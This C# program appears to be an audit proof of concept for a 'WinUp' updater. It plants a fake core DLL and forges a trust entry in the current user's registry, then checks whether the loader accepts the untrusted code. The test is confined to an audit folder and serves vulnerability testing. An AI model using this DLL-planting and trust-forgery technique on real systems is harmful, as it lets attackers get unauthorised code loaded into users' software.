using System;
using System.IO;
using Microsoft.Win32;
using WinUp;
class CoreAttack
{
    static int Main()
    {
        string root = AppDomain.CurrentDomain.BaseDirectory;
        if (!root.StartsWith(@"C:\WinUpAudit\", StringComparison.OrdinalIgnoreCase)) return 2;
        var fake = File.ReadAllBytes(Path.Combine(root,"fake-core.dll"));
        Directory.CreateDirectory(CoreLoader.CoreDir);
        File.WriteAllBytes(CoreLoader.CoreFile, fake);
        using (var registry = Registry.CurrentUser.CreateSubKey(@"Software\WinUp\TrustedCore"))
            registry.SetValue(CoreLoader.Sha256(fake), "99.0.0 synthetic forged trust");
        var loaded = CoreLoader.Resolve();
        bool accepted = loaded.GetName().Version.Major == 99;
        Console.WriteLine("OBSERVATION accepted-untrusted-core=" + accepted);
        Console.WriteLine("loaded-version=" + loaded.GetName().Version);
        Console.WriteLine("Note=" + CoreLoader.Note);
        return 0;
    }
}
